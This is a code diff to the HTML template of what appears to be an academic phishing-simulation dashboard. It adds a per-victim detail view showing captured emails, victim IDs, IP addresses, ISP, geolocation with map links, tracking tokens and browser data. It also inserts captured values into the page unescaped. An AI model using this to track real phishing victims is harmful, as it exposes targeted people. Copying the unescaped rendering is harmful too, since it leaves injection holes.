@@ -156,9 +156,108 @@
       color: #999;
       margin-top: 32px;
     }
+
+    /* Clickable rows */
+    tbody tr { cursor: pointer; }
+    tbody tr:hover { background: #f0f4ff !important; }
+
+    /* Modal overlay */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.45);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-overlay.open { display: flex; }
+
+    .modal-box {
+      background: #fff;
+      border-radius: 10px;
+      padding: 32px 36px;
+      width: 100%;
+      max-width: 560px;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 8px 40px rgba(0,0,0,.25);
+      position: relative;
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 14px; right: 18px;
+      background: none; border: none;
+      font-size: 22px; color: #999;
+      cursor: pointer; line-height: 1;
+    }
+    .modal-close:hover { color: #333; }
+
+    .modal-title {
+      font-size: 17px; font-weight: 700;
+      color: #1a1a1a; margin-bottom: 24px;
+      padding-right: 24px;
+    }
+
+    .detail-grid {
+      display: grid;
+      grid-template-columns: 140px 1fr;
+      gap: 10px 16px;
+      font-size: 13px;
+    }
+
+    .detail-label {
+      font-weight: 600; color: #666;
+      text-transform: uppercase;
+      font-size: 11px; letter-spacing: .4px;
+      padding-top: 2px;
+    }
+
+    .detail-value { color: #1a1a1a; word-break: break-all; }
+
+    .detail-section {
+      grid-column: 1 / -1;
+      border-top: 1px solid #eee;
+      margin: 8px 0 4px;
+      padding-top: 12px;
+      font-size: 11px;
+      font-weight: 700;
+      color: #0067b8;
+      text-transform: uppercase;
+      letter-spacing: .6px;
+    }
+
+    .maps-link {
+      display: inline-block;
+      margin-top: 4px;
+      font-size: 12px;
+      color: #0067b8;
+      text-decoration: none;
+    }
+    .maps-link:hover { text-decoration: underline; }
+
+    .ua-pill {
+      display: inline-block;
+      background: #f0f4f8;
+      border-radius: 4px;
+      padding: 2px 8px;
+      font-size: 12px;
+      color: #333;
+      margin-bottom: 4px;
+    }
   </style>
 </head>
 <body>
+  <!-- Detail modal -->
+  <div id="modal" class="modal-overlay" onclick="handleOverlayClick(event)">
+    <div class="modal-box">
+      <button class="modal-close" onclick="closeModal()">×</button>
+      <div class="modal-title">Detalhes da Captura</div>
+      <div id="modal-content" class="detail-grid"></div>
+    </div>
+  </div>
+
   <header class="header">
     <div>
       <h1>Dashboard da Campanha</h1>
@@ -235,25 +334,37 @@
             <th>Timestamp (UTC)</th>
             <th>Email</th>
             <th>IP</th>
+            <th>Localização</th>
+            <th>ISP / Operador</th>
             <th>Origem</th>
-            <th>Browser</th>
           </tr>
         </thead>
         <tbody>
           {% for c in captures %}
-          <tr>
+          <tr onclick="showDetail({{ loop.index0 }})">
             <td>{{ c.timestamp[:19].replace("T", " ") }}</td>
             <td>{{ c.email or "—" }}</td>
-            <td>{{ c.ip }}</td>
+            <td title="{{ c.user_agent }}">{{ c.ip }}</td>
+            <td>
+              {% if c.geo %}
+                {{ c.flag }} {{ c.geo.city }}, {{ c.geo.country }}
+              {% else %}
+                —
+              {% endif %}
+            </td>
+            <td>
+              {% if c.geo %}
+                <span style="color:#555;font-size:12px;">{{ c.geo.isp or "—" }}</span>
+              {% else %}
+                —
+              {% endif %}
+            </td>
             <td>
               {% if c.track_token %}
                 <span class="badge email">Email</span>
               {% else %}
                 <span class="badge direct">Direto</span>
               {% endif %}
-            </td>
-            <td title="{{ c.user_agent }}">
-              {{ c.user_agent[:60] }}{% if c.user_agent | length > 60 %}…{% endif %}
             </td>
           </tr>
           {% endfor %}
@@ -266,5 +377,95 @@
 
     <p class="footer-note">Projeto académico SEGRED · Diogo Sá (31378) · Diogo Monteiro (32428)</p>
   </main>
+
+  <script>
+    const captures = {{ captures | tojson }};
+
+    function parseUA(ua) {
+      if (!ua) return { browser: '—', os: '—' };
+      let browser = 'Desconhecido';
+      if (/Edg\//.test(ua))           browser = 'Microsoft Edge';
+      else if (/OPR\//.test(ua))      browser = 'Opera';
+      else if (/Chrome\//.test(ua))   browser = 'Google Chrome';
+      else if (/Firefox\//.test(ua))  browser = 'Mozilla Firefox';
+      else if (/Safari\//.test(ua))   browser = 'Safari';
+      else if (/curl\//.test(ua))     browser = 'cURL';
+
+      let os = 'Desconhecido';
+      if (/Windows NT 10/.test(ua))   os = 'Windows 10 / 11';
+      else if (/Windows NT/.test(ua)) os = 'Windows';
+      else if (/iPhone/.test(ua))     os = 'iOS (iPhone)';
+      else if (/iPad/.test(ua))       os = 'iOS (iPad)';
+      else if (/Android/.test(ua))    os = 'Android';
+      else if (/Mac OS X/.test(ua))   os = 'macOS';
+      else if (/Linux/.test(ua))      os = 'Linux';
+
+      return { browser, os };
+    }
+
+    function row(label, value) {
+      return `<div class="detail-label">${label}</div><div class="detail-value">${value || '—'}</div>`;
+    }
+
+    function section(title) {
+      return `<div class="detail-section">${title}</div>`;
+    }
+
+    function showDetail(idx) {
+      const c = captures[idx];
+      const geo = c.geo || {};
+      const ua = parseUA(c.user_agent);
+      const ts = (c.timestamp || '').slice(0, 19).replace('T', ' ') + ' UTC';
+
+      const mapsHtml = (geo.lat && geo.lon)
+        ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}
+           <br><a class="maps-link" href="https://www.google.com/maps?q=${geo.lat},${geo.lon}" target="_blank">
+             🗺 Abrir no Google Maps
+           </a>`
+        : '—';
+
+      const origin = c.track_token
+        ? `📧 Email (token: <code>${c.track_token}</code>)`
+        : '🔗 Acesso direto';
+
+      let html = '';
+
+      html += section('Identidade');
+      html += row('Timestamp', ts);
+      html += row('Email', c.email || '—');
+      html += row('Victim ID', `<code style="font-size:11px">${c.victim_id || '—'}</code>`);
+      html += row('Origem', origin);
+
+      html += section('Rede');
+      html += row('IP', `<strong>${c.ip}</strong>`);
+      html += row('ISP', geo.isp || '—');
+      html += row('Organização', geo.org || '—');
+
+      html += section('Localização');
+      html += row('País', geo.countryCode
+        ? `${c.flag} ${geo.city}, ${geo.regionName}, ${geo.country}`
+        : '—');
+      html += row('Timezone', geo.timezone || '—');
+      html += row('Coordenadas', mapsHtml);
+
+      html += section('Dispositivo');
+      html += row('Browser', `<span class="ua-pill">${ua.browser}</span>`);
+      html += row('Sistema Op.', `<span class="ua-pill">${ua.os}</span>`);
+      html += row('User-Agent', `<span style="font-size:11px;color:#777">${c.user_agent || '—'}</span>`);
+
+      document.getElementById('modal-content').innerHTML = html;
+      document.getElementById('modal').classList.add('open');
+    }
+
+    function closeModal() {
+      document.getElementById('modal').classList.remove('open');
+    }
+
+    function handleOverlayClick(e) {
+      if (e.target === document.getElementById('modal')) closeModal();
+    }
+
+    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+  </script>
 </body>
 </html>
